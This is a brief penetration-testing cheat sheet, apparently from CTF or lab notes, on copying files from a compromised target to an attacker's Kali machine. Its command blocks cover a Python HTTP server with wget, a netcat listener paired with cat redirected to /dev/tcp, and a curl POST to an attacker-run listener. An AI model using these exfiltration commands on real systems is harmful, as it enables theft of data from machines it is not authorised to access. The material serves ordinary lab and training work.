# Download
Very often we want to download and open locally a file we found in the target machine.

## Python
The simplest way to do it is to start a Python Server in the same directory of the file and send a GET request

```console
# [TARGET] From shell
python3 -m http.server {PORT}

# [KALI] From shell
wget {TARGET_IP}:{PORT}/{FILE_NAME}

# [KALI] From browser
http://{TARGET_IP}:{PORT}/{FILE_NAME}
```

## Cat
It can happen the target System has not python installed. In this case we can send any file using cat
```console
# From kali
nc -lvnp 9001 > file_name

# From target
cat {FILE} > /dev/tcp/{KALI_IP}/9001

```


## Curl
It can happen the target System has not python installed. In this case we can start a Python server locally and send a POST request (simulating an upload).
downloader.py can be found on `scripts` folder

```console
# From kali
python downloader.py

# From target 
curl {KALI_IP}:9002 -X POST -F 'file=@"{/path/file}"'
```